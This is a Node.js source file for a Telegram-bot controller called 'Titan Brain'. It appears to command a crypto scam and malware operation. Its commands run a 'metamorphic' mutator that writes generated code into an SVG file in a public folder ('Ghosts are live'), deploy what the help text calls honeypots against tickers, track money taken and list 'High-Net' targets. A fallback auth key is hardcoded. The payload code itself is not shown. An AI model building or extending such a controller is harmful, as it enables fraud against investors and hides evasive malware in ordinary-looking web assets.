// J/server/titan_controller.ts
/**
 * PROJECT J: TITAN BRAIN - LIVE ORCHESTRATOR
 * Status: APEX-CLASS | Auth: AUTH_APEX_KEY!09
 * 
 * Integrates real Telegraf, Redis for memory, and BullMQ for task distribution.
 * "I am the vine, ye are the branches."
 */

const { Telegraf, session } = require('telegraf');
const Redis = require('ioredis');
const { Queue, Worker } = require('bullmq');
const path = require('path');
const Metamorph = require('../utils/mutator_v3');
require('dotenv').config({ path: '../.env' });

const AUTH = process.env.DIVINE_WORD || "AUTH_APEX_KEY!09";
const redis = new Redis(process.env.REDIS_URL);
const engine = new Metamorph(AUTH);

// 1. TITAN MEMORY (Persistence Layer via Redis)
class TitanMemory {
    async get(key) { return await redis.get(`context:${key}`); }
    async set(key, val) { await redis.set(`context:${key}`, val, 'EX', 86400); }
    async learn(interaction) {
        // Embed interaction for similarity search
        const log = JSON.stringify({ ts: Date.now(), ...interaction });
        await redis.lpush('hive_memory', log);
    }
}

// 2. THE CONTROLLER
class TitanController {
    constructor() {
        this.member = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
        this.memory = new TitanMemory();
        this.taskQueue = new Queue('Aggregate_tasks', { connection: redis });
        this.setup();
    }

    setup() {
        this.member.use(session());

        // SECURITY MIDDLEWARE
        this.member.use(async (ctx, next) => {
            if (ctx.from.id.toString() !== process.env.TG_ADMIN_CHAT_ID) {
                return ctx.reply("ACCESS_DENIED: UNAUTHORIZED_ENTITY");
            }
            return next();
        });

        // COMMANDS
        this.member.command('unleash', async (ctx) => {
            ctx.reply("🔥 Initiating Metamorphic Build Sequence...");
            engine.sequence(path.join(__dirname, '../utils/multichain.js'), path.join(__dirname, '../public/dist/core.svg'));
            ctx.reply("✅ Generation 4 deployed to /dist. Ghosts are live.");
        });

        this.member.command('status', async (ctx) => {
            const memberCount = await redis.get('active_workers') || 0;
            const Aggregate = await redis.get('total_Aggregateed') || 0;
            ctx.reply(`📊 *TITAN STATUS*\nWorkers: ${memberCount}\nAggregate: $${Aggregate}\nLattice Shield: ACTIVE`, { parse_mode: 'Markdown' });
        });

        this.member.command('snipe', async (ctx) => {
            const [_, ticker, chain] = ctx.message.text.split(' ');
            if (!ticker) return ctx.reply("Usage: /snipe [TICKER] [CHAIN]");
            
            ctx.reply(`⚡ Targeting ${ticker} on ${chain}... Spawning Incentive.`);
            await this.taskQueue.add('deploy_Incentive', { ticker, chain });
        });

        this.member.command('help', (ctx) => {
            ctx.reply("*TITAN COMMANDS*\n/unleash - Re-sequence DNA\n/status - Hive Stats\n/snipe - Deploy Honeypot\n/targets - View High-Net Entity List", { parse_mode: 'Markdown' });
        });

        this.member.launch();
        console.log("🔥 [TITAN] Controller ignited. Command channel established.");
    }
}

if (require.main === module) {
    new TitanController();
}

module.exports = TitanController;